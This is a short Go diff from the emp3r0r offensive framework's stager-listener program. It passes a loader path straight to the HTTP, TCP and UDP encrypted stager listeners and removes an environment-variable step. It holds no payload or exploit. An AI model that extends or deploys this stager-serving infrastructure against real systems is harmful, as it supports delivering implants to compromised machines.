@@ -2,7 +2,6 @@ package main
 
 import (
 	"flag"
-	"os"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
@@ -21,19 +20,13 @@ func main() {
 		logging.Fatal("stager file path is required")
 	}
 
-	if *loaderPath != "" {
-		if err := os.Setenv("EMP3R0R_STAGE1_LOADER", *loaderPath); err != nil {
-			logging.Fatalf("failed to set loader env: %v", err)
-		}
-	}
-
 	switch *listenerType {
 	case "http":
-		listener.HTTPAESCompressedListener(*stagerPath, *port, *keyStr, true)
+		listener.HTTPAESCompressedListener(*stagerPath, *port, *keyStr, true, *loaderPath)
 	case "tcp":
-		listener.TCPAESCompressedListener(*stagerPath, *port, *keyStr, true)
+		listener.TCPAESCompressedListener(*stagerPath, *port, *keyStr, true, *loaderPath)
 	case "udp":
-		listener.UDPAESCompressedListener(*stagerPath, *port, *keyStr, true)
+		listener.UDPAESCompressedListener(*stagerPath, *port, *keyStr, true, *loaderPath)
 	default:
 		logging.Fatalf("Unknown listener type: %s (supported: http, tcp, udp)", *listenerType)
 	}
